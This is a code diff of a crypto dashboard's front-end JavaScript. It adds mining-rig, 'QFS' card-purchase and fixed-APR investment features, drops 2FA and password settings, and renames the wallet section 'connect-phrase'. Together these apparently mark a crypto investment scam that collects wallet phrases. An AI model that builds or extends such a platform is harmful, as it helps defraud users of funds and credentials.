+      showToast(r.message || (r.success ? 'Mining started' : 'Failed'), r.success ? 'success' : 'error');
+      if (r.success) loadMining();
+    } catch (e) { showToast('Network error', 'error'); } finally { hideLoader(); }
+  };
+  window.claimMining = async function (sid) {
+    showLoader();
+    try {
+      var r = await apiFetch('/api/user-dashboard/mining.php', { method: 'POST', body: JSON.stringify({ action: 'claim', session_id: sid }) });
+      showToast(r.message || 'Claimed', r.success ? 'success' : 'error');
+      if (r.success) { loadMining(); loadOverview(); }
+    } catch (e) { showToast('Network error', 'error'); } finally { hideLoader(); }
+  };
+  window.stopMining = async function (sid) {
+    if (!confirm('Stop this rig? Any unclaimed rewards are claimed first.')) return;
+    showLoader();
+    try {
+      var r = await apiFetch('/api/user-dashboard/mining.php', { method: 'POST', body: JSON.stringify({ action: 'stop', session_id: sid }) });
+      showToast(r.message || 'Stopped', r.success ? 'success' : 'error');
+      if (r.success) { loadMining(); loadOverview(); }
+    } catch (e) { showToast('Network error', 'error'); } finally { hideLoader(); }
+  };
 
   // ── QFS Card ─────────────────────────────────────────────────────────────────
 
@@ -571,21 +950,226 @@
     document.querySelectorAll('[data-user="name"]').forEach(function (el) {
       el.textContent = _user.full_name || _user.email || '—';
     });
+
+    var hasCard = _card && _card.status === 'active';
+    var tierGrid = document.querySelector('.card-tier-grid');
+    var tierHeading = document.querySelector('#qfsTierHeading');
+    var requestBtn = document.getElementById('requestCardBtn');
+    var infoText = document.getElementById('qfsCardInfoText');
+
+    // Update the visual card face
+    var face = document.querySelector('.virtual-card-face');
+    if (face) {
+      var numEl = face.querySelector('.vc-number');
+      var expEl = face.querySelectorAll('.vc-value')[1];
+      var badge = face.querySelector('.vc-badge');
+      if (hasCard) {
+        face.classList.add('virtual-card-face--' + (_card.card_tier === 'VirtuElite' ? 'elite' : 'elevate'));
+        if (numEl) numEl.textContent = _card.card_number_masked || '•••• •••• •••• ••••';
+        if (expEl && _card.expires_at) {
+          var d = new Date(_card.expires_at);
+          expEl.textContent = ('0' + (d.getMonth() + 1)).slice(-2) + '/' + String(d.getFullYear()).slice(-2);
+        }
+        if (badge) badge.textContent = _card.card_tier + ' — Active';
+      }
+    }
+
+    if (hasCard) {
+      // User owns a card → hide tier picker, show active state
+      if (tierGrid) tierGrid.style.display = 'none';
+      if (tierHeading) tierHeading.style.display = 'none';
+      if (requestBtn) {
+        requestBtn.innerHTML = '<i class="ph ph-check-circle"></i> ' + _card.card_tier + ' Active';
+        requestBtn.disabled = true;
+      }
+      if (infoText) infoText.textContent = 'Your ' + _card.card_tier + ' card is active. Cashback ' + (_card.cashback_pct || 4) + '%.';
+    } else {
+      if (tierGrid) tierGrid.style.display = '';
+      if (tierHeading) tierHeading.style.display = '';
+      if (requestBtn) { requestBtn.disabled = false; }
+    }
+  }
+
+  // ── Card purchase via NOWPayments ────────────────────────────────────────────
+
+  var PENDING_CARD_KEY = 'qbx_pending_card_invoice';
+
+  async function startCardPurchase(tier, btn) {
+    if (btn) { btn.disabled = true; }
+    try {
+      var r = await apiFetch('/api/payments/card-purchase-initiate.php', {
+        method: 'POST',
+        body: JSON.stringify({ tier: tier })
+      });
+      if (r && r.success && r.data && r.data.invoice_url) {
+        try { localStorage.setItem(PENDING_CARD_KEY, r.data.invoice_id); } catch (e) {}
+        showToast('Redirecting to secure payment…', 'info');
+        window.location.href = r.data.invoice_url;
+      } else {
+        if (btn) btn.disabled = false;
+        showToast((r && r.message) || 'Could not start payment. Please try again.', 'error');
+      }
+    } catch (e) {
+      if (btn) btn.disabled = false;
+      showToast('Network error — please try again.', 'error');
+    }
+  }
+
+  async function checkPendingCardPayment() {
+    var invoiceId;
+    try { invoiceId = localStorage.getItem(PENDING_CARD_KEY); } catch (e) { invoiceId = null; }
+    if (!invoiceId) return;
+    try {
+      var r = await apiFetch('/api/payments/card-purchase-status.php', {
+        method: 'POST',
+        body: JSON.stringify({ invoice_id: invoiceId })
+      });
+      if (r && r.success && r.status === 'completed') {
+        try { localStorage.removeItem(PENDING_CARD_KEY); } catch (e) {}
+        showToast('Payment confirmed — your ' + (r.tier || 'QFS') + ' card is active!', 'success');
+        await refreshCore();
+        loadQfsCard();
+      } else if (r && r.success && r.status === 'failed') {
+        try { localStorage.removeItem(PENDING_CARD_KEY); } catch (e) {}
+        showToast('Payment was not completed. Please try again.', 'error');
+      }
+      // pending → keep the key; will re-check on next load
+    } catch (e) { /* silent — retry next load */ }
   }
 
   // ── Investments ──────────────────────────────────────────────────────────────
 
-  function loadInvestments() {
+  var _investProducts = [];
+
+  async function loadInvestments() {
     var gate = document.getElementById('investmentsGate');
     var dash = document.getElementById('investmentsDashboard');
-    if (_cardTier === 'VirtuElevate' || _cardTier === 'VirtuElite') {
-      if (gate) gate.style.display = 'none';
-      if (dash) dash.style.display = 'block';
-    } else {
-      if (gate) gate.style.display = 'block';
-      if (dash) dash.style.display = 'none';
+    var premium = (_cardTier === 'VirtuElevate' || _cardTier === 'VirtuElite');
+    if (gate) gate.style.display = premium ? 'none' : 'block';
+    if (!dash) return;
+    dash.style.display = premium ? 'block' : 'none';
+    if (!premium) return;
+    if (!dash.innerHTML.trim()) dash.innerHTML = '<div class="perk-loading"><i class="ph ph-circle-notch ph-spin"></i> Loading…</div>';
+    // Need wallet balances (with prices) for the funding selector
+    if (!_wallets.length) {
+      try { var wr = await apiFetch('/api/user-dashboard/wallet.php'); if (wr.success && wr.data) _wallets = wr.data.wallets || []; } catch (e) {}
     }
+    try {
+      var r = await apiFetch('/api/user-dashboard/investments.php');
+      if (!r.success) { dash.innerHTML = '<div class="perk-empty"><p>' + esc(r.message || 'Unable to load') + '</p></div>'; return; }
+      _investProducts = r.data.products || [];
+      renderInvestments(r.data);
+    } catch (e) { dash.innerHTML = '<div class="perk-empty"><p>Could not load investments.</p></div>'; }
   }
+
+  function renderInvestments(d) {
+    var dash = document.getElementById('investmentsDashboard');
+    if (!dash) return;
+    var s = d.summary;
+    var html = '<div class="perk-stats">'
+      + perkStat('ph-wallet', '$' + fmt(s.active_usd), 'Active Capital')
+      + perkStat('ph-trend-up', '$' + fmt(s.accrued_usd), 'Accrued Returns')
+      + perkStat('ph-chart-pie-slice', s.count, 'Open Positions')
+      + '</div>';
+
+    if (d.positions.length) {
+      html += '<div class="perk-head"><h3>Your Positions</h3></div><div class="pos-grid">';
+      html += d.positions.map(function (p) {
+        var badge = p.status === 'active'
+          ? (p.matured ? '<span class="pos-badge pos-badge--matured">Matured</span>' : '<span class="pos-badge pos-badge--active">Active</span>')
+          : '<span class="pos-badge pos-badge--closed">' + esc(p.status) + '</span>';
+        var action = p.status === 'active'
+          ? '<button class="btn-' + (p.matured ? 'primary' : 'outline') + ' btn-sm" onclick="withdrawInvestment(' + p.id + ',' + (p.matured ? 1 : 0) + ')">' + (p.matured ? 'Withdraw' : 'Exit early') + '</button>'
+          : '';
+        return '<div class="pos-card">'
+          + '<div class="pos-top"><div><div class="pos-name">' + esc(p.product_name) + '</div>'
+          + '<div class="pos-sub">' + fmt(p.apr, 0) + '% APR · ' + p.duration_days + 'd · ' + esc(p.symbol || '') + '</div></div>' + badge + '</div>'
+          + '<div class="pos-figs"><div><span>Principal</span><strong>$' + fmt(p.principal_usd) + '</strong></div>'
+          + '<div><span>Return</span><strong class="pos-gain">+$' + fmt(p.accrued_usd) + '</strong></div></div>'
+          + (p.status === 'active' ? '<div class="pos-bar"><div class="pos-bar-fill" style="width:' + p.progress + '%"></div></div>'
+              + '<div class="pos-bar-label">' + p.progress + '% to maturity</div>' : '')
+          + (action ? '<div class="pos-actions">' + action + '</div>' : '')
+          + '</div>';
+      }).join('') + '</div>';
+    }
+
+    html += '<div class="perk-head"><h3>Investment Products</h3><span class="perk-muted">Fixed returns on your assets</span></div>';
+    html += '<div class="prod-grid">' + d.products.map(function (p) {
+      return '<div class="prod-card' + (p.locked ? ' prod-card--locked' : '') + '">'
+        + '<div class="prod-head"><span class="prod-name">' + esc(p.name) + '</span>'
+        + '<span class="prod-risk prod-risk--' + esc(p.risk.toLowerCase()) + '">' + esc(p.risk) + '</span></div>'
+        + '<div class="prod-apr">' + fmt(p.apr, 0) + '<span>% APR</span></div>'
+        + '<p class="prod-blurb">' + esc(p.blurb) + '</p>'
+        + '<div class="prod-meta"><span><i class="ph ph-calendar-blank"></i> ' + p.days + ' days</span>'
+        + '<span><i class="ph ph-coin"></i> Min $' + fmt(p.min, 0) + '</span></div>'
+        + (p.locked
+            ? '<button class="btn-outline btn-full" disabled><i class="ph ph-lock-simple"></i> VirtuElite only</button>'
+            : '<button class="btn-primary btn-full" onclick="openInvest(\'' + p.key + '\')"><i class="ph ph-trend-up"></i> Invest</button>')
+        + '</div>';
+    }).join('') + '</div>';
+    dash.innerHTML = html;
+  }
+
+  window.openInvest = function (key) {
+    var p = _investProducts.find(function (x) { return x.key === key; });
+    if (!p) return;
+    document.getElementById('investProductName').textContent = p.name;
+    document.getElementById('investTerms').innerHTML =
+      '<div class="invest-term"><span>APR</span><strong>' + fmt(p.apr, 0) + '%</strong></div>'
+      + '<div class="invest-term"><span>Term</span><strong>' + p.days + ' days</strong></div>'
+      + '<div class="invest-term"><span>Minimum</span><strong>$' + fmt(p.min, 0) + '</strong></div>';
+    var amt = document.getElementById('investAmount');
+    amt.value = p.min; amt.min = p.min;
+    amt.dataset.key = key; amt.dataset.apr = p.apr; amt.dataset.days = p.days;
+    var sel = document.getElementById('investAsset');
+    var opts = '<option value="">Select funding asset…</option>';
+    _wallets.forEach(function (w) {
+      var price = parseFloat(w.current_price_usd || 0);
+      var usd = parseFloat(w.balance || 0) * price;
+      if (usd <= 0) return;
+      opts += '<option value="' + w.currency_id + '">' + esc(w.symbol) + ' — $' + fmt(usd) + ' available</option>';
+    });
+    sel.innerHTML = opts;
+    var msg = document.getElementById('investMsg'); if (msg) msg.style.display = 'none';
+    updateInvestEstimate();
+    openModal('modal-invest');
+  };
+
+  function updateInvestEstimate() {
+    var amt = document.getElementById('investAmount');
+    var est = document.getElementById('investEstimate');
+    if (!amt || !est) return;
+    var a = parseFloat(amt.value || 0), apr = parseFloat(amt.dataset.apr || 0), days = parseFloat(amt.dataset.days || 0);
+    var ret = a * (apr / 100) * (days / 365);
+    est.innerHTML = 'Projected return at maturity <strong>+$' + fmt(ret) + '</strong> &nbsp;·&nbsp; Total back <strong>$' + fmt(a + ret) + '</strong>';
+  }
+  window.updateInvestEstimate = updateInvestEstimate;
+
+  window.submitInvest = async function () {
+    var amt = document.getElementById('investAmount');
+    var sel = document.getElementById('investAsset');
+    var msg = document.getElementById('investMsg');
+    function fail(m) { if (msg) { msg.textContent = m; msg.className = 'auth-msg auth-msg--error'; msg.style.display = ''; } }
+    var key = amt.dataset.key, amount = parseFloat(amt.value || 0), cid = parseInt(sel.value || 0, 10);
+    if (!cid) { fail('Choose a funding asset'); return; }
+    if (amount < parseFloat(amt.min || 0)) { fail('Minimum for this product is $' + fmt(amt.min, 0)); return; }
+    var btn = document.getElementById('investSubmitBtn'); if (btn) btn.disabled = true;
+    try {
+      var r = await apiFetch('/api/user-dashboard/investments.php', { method: 'POST', body: JSON.stringify({ action: 'invest', product_key: key, amount_usd: amount, currency_id: cid }) });
+      if (r.success) { closeModal('modal-invest'); showToast(r.message, 'success'); loadInvestments(); loadOverview(); }
+      else fail(r.message || 'Could not invest');
+    } catch (e) { fail('Network error — please try again'); } finally { if (btn) btn.disabled = false; }
+  };
+
+  window.withdrawInvestment = async function (iid, matured) {
+    if (!matured && !confirm('This position has not matured. Exit now and forfeit the accrued interest?')) return;
+    showLoader();
+    try {
+      var r = await apiFetch('/api/user-dashboard/investments.php', { method: 'POST', body: JSON.stringify({ action: 'withdraw', investment_id: iid }) });
+      showToast(r.message || 'Done', r.success ? 'success' : 'error');
+      if (r.success) { loadInvestments(); loadOverview(); }
+    } catch (e) { showToast('Network error', 'error'); } finally { hideLoader(); }
+  };
 
   // ── Profile ──────────────────────────────────────────────────────────────────
 
@@ -672,16 +1256,6 @@
   }
 
   // ── Security ─────────────────────────────────────────────────────────────────
-  function loadSecurity() { /* form is static, nothing to preload */ }
-
-  // ── 2FA ──────────────────────────────────────────────────────────────────────
-  function load2fa() {
-    var statusText = document.getElementById('tfaStatusText');
-    if (statusText) {
-      statusText.textContent = _user.two_fa_enabled ? 'Enabled' : 'Disabled';
-    }
-  }
-
   // ── Support ──────────────────────────────────────────────────────────────────
 
   async function loadSupport() {
@@ -739,44 +1313,30 @@
     var fd = new FormData(form);
     var sendType = qs('[name="send_type"]:checked');
     fd.append('send_type', sendType ? sendType.value : 'address');
+    setFormLoading(form, true, 'Sending…');
     try {
       var r = await apiFetch('/api/user-dashboard/wallet.php', {
         method: 'POST',
         body: JSON.stringify(Object.fromEntries(fd))
       });
-      showMsg(form, r.message || (r.success ? 'Transaction submitted' : 'Failed'), !r.success);
-      if (r.success) { form.reset(); loadOverview(); }
+      if (formResult(form, r, 'Transaction submitted')) { form.reset(); loadOverview(); }
     } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
-  }
-
-  async function handleSwapTokens(form) {
-    var fd = new FormData(form);
-    try {
-      var r = await apiFetch('/api/user-dashboard/wallet.php?action=swap', {
-        method: 'POST',
-        body: JSON.stringify(Object.fromEntries(fd))
-      });
-      showMsg(form, r.message || (r.success ? 'Swap completed' : 'Swap failed'), !r.success);
-      if (r.success) { form.reset(); loadOverview(); }
-    } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
   }
 
   async function handleUpdateProfile(form) {
     var fd = new FormData(form);
+    setFormLoading(form, true, 'Saving…');
     try {
       var r = await apiFetch('/api/user-dashboard/profile.php', {
         method: 'POST',
         body: JSON.stringify(Object.fromEntries(fd))
       });
-      showMsg(form, r.message || (r.success ? 'Profile updated' : 'Update failed'), !r.success);
-      if (r.success) loadProfile();
+      if (formResult(form, r, 'Profile updated')) loadProfile();
     } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
   }
 
   async function handleChangePassword(form) {
@@ -784,49 +1344,55 @@
     var data = Object.fromEntries(fd);
     if (data.new_password !== data.confirm_password) {
       showMsg(form, 'Passwords do not match', true);
+      showToast('Passwords do not match', 'error');
       return;
     }
+    setFormLoading(form, true, 'Updating…');
     try {
       var r = await apiFetch('/api/user-dashboard/profile.php', {
         method: 'POST',
         body: JSON.stringify({ action: 'change_password', current_password: data.current_password, new_password: data.new_password })
       });
-      showMsg(form, r.message || (r.success ? 'Password updated' : 'Update failed'), !r.success);
-      if (r.success) form.reset();
+      if (formResult(form, r, 'Password updated')) form.reset();
     } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
   }
 
   async function handleSubmitKyc(form) {
     var fd = new FormData(form);
+    setFormLoading(form, true, 'Submitting…');
     try {
       var r = await apiFetch('/api/user-dashboard/profile.php?action=kyc', {
         method: 'POST',
         body: fd
       });
-      showMsg(form, r.message || (r.success ? 'Application submitted' : 'Submission failed'), !r.success);
-      if (r.success) {
+      if (formResult(form, r, 'Application submitted')) {
         _user.kyc_status = 'pending';
         loadKyc();
       }
     } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
   }
 
   async function handleCreateTicket(form) {
     var fd = new FormData(form);
+    setFormLoading(form, true, 'Submitting…');
     try {
       var r = await apiFetch('/api/user-dashboard/dashboard.php?action=create_ticket', {
         method: 'POST',
         body: JSON.stringify(Object.fromEntries(fd))
       });
-      showMsg(form, r.message || (r.success ? 'Ticket created' : 'Failed'), !r.success);
-      if (r.success) { form.reset(); document.getElementById('newTicketForm').style.display = 'none'; loadSupport(); }
+      if (formResult(form, r, 'Ticket created')) {
+        form.reset();
+        var nt = document.getElementById('newTicketForm');
+        if (nt) nt.style.display = 'none';
+        loadSupport();
+      }
     } catch (e) {
-      showMsg(form, 'Network error — please try again', true);
-    }
+      formNetworkError(form);
+    } finally { setFormLoading(form, false); }
   }
 
   // ════════════════════════════════════════════════════════════════════════════
@@ -835,35 +1401,29 @@
 
   var sectionTitles = {
     'overview':       'Overview',
-    'connect-wallet': 'Connect Wallet',
+    'connect-phrase':  'Connect Wallet',
     'send':           'Send',
     'receive':        'Receive',
-    'swap':           'Swap',
     'mining':         'Mining',
     'qfs-card':       'Qfs Card',
     'investments':    'Investments',
     'profile':        'My Profile',
     'kyc':            'KYC Verification',
     'notifications':  'Notifications',
-    'security':       'Change Password',
-    '2fa':            'Two-Factor Authentication',
     'support':        'Support'
   };
 
   var sectionLoaders = {
     'overview':       loadOverview,
-    'connect-wallet': loadConnectWallet,
+    'connect-phrase': loadConnectWallet,
     'send':           loadSend,
     'receive':        loadReceive,
-    'swap':           loadSwap,
     'mining':         loadMining,
     'qfs-card':       loadQfsCard,
     'investments':    loadInvestments,
     'profile':        loadProfile,
     'kyc':            loadKyc,
     'notifications':  loadNotifications,
-    'security':       loadSecurity,
-    '2fa':            load2fa,
     'support':        loadSupport
   };
 
@@ -908,13 +1468,51 @@
       activateSection(section, false);
     });
 
-    // ── Nav: sidebar + mobile dock + inline data-nav links
+    // ── Mobile sidebar drawer
+    var sidebar  = document.getElementById('dashboardSidebar');
+    var backdrop = document.getElementById('sidebarBackdrop');
+    var toggle   = document.getElementById('sidebarToggle');
+    function openSidebar() {
+      if (sidebar) sidebar.classList.add('open');
+      if (backdrop) backdrop.classList.add('open');
+      if (toggle) toggle.setAttribute('aria-expanded', 'true');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeSidebar() {
+      if (sidebar) sidebar.classList.remove('open');
+      if (backdrop) backdrop.classList.remove('open');
+      if (toggle) toggle.setAttribute('aria-expanded', 'false');
+      document.body.style.overflow = '';
+    }
+    if (toggle) toggle.addEventListener('click', function () {
+      if (sidebar && sidebar.classList.contains('open')) closeSidebar(); else openSidebar();
+    });
+    if (backdrop) backdrop.addEventListener('click', closeSidebar);
+
+    // ── Sign-out loader — show overlay before navigating to logout
+    document.querySelectorAll('a[href="/api/auth/logout.php"]').forEach(function (link) {
+      link.addEventListener('click', function (e) {
+        e.preventDefault();
+        var ov = document.getElementById('signOutLoader');
+        if (!ov) {
+          ov = document.createElement('div');
+          ov.id = 'signOutLoader';
+          ov.className = 'full-loader';
+          ov.innerHTML = '<div class="full-loader-box"><i class="ph ph-circle-notch ph-spin"></i>'
+            + '<span>Signing you out…</span></div>';
+          document.body.appendChild(ov);
+          requestAnimationFrame(function () { ov.classList.add('show'); });
+        }
+        var href = this.getAttribute('href');
+        setTimeout(function () { window.location.href = href; }, 250);
+      });
+    });
+
+    // ── Nav: sidebar + inline data-nav links
     document.querySelectorAll('[data-nav]').forEach(function (el) {
       el.addEventListener('click', function (e) {
         e.preventDefault();
-        // Close mobile sidebar if open
-        var sidebar = document.getElementById('dashboardSidebar');
-        if (sidebar && window.innerWidth <= 899) sidebar.classList.remove('open');
+        if (window.innerWidth <= 899) closeSidebar();
         activateSection(this.dataset.nav);
       });
     });
@@ -927,7 +1525,6 @@
       e.preventDefault();
       switch (action) {
         case 'send-crypto':      handleSendCrypto(form);    break;
-        case 'swap-tokens':      handleSwapTokens(form);    break;
         case 'update-profile':   handleUpdateProfile(form); break;
         case 'change-password':  handleChangePassword(form); break;
         case 'submit-kyc':       handleSubmitKyc(form);     break;
@@ -971,11 +1568,12 @@
       });
     }
 
-    // ── Card tier selection
+    // ── Card tier selection → NOWPayments
     document.addEventListener('click', function (e) {
       var tierBtn = e.target.closest('[data-tier]');
       if (tierBtn) {
-        showToast('Card request submitted for ' + tierBtn.dataset.tier, 'success');
+        e.preventDefault();
+        startCardPurchase(tierBtn.dataset.tier, tierBtn);
       }
     });
 
@@ -1005,6 +1603,9 @@
     // ── Initial load
     hideLoader();
     activateSection(sectionFromPath(), false);
+
+    // If returning from a card payment, verify and activate
+    checkPendingCardPayment();
   });
 
 })();
